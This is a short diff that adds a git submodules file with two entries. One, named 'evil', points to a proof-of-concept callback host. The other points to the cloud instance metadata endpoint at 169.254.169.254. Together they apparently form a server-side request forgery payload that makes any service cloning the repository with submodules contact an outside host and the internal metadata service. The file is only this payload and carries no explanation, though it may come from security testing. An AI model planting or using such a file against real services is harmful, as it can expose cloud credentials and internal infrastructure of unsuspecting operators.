@@ -1,0 +1,6 @@
+[submodule "evil"]
+	path = evil
+	url = https://callback.poc.rhynorater.com/submod-1781112794/sub-evil
+[submodule "meta"]
+	path = meta
+	url = http://169.254.169.254/computeMetadata/v1/
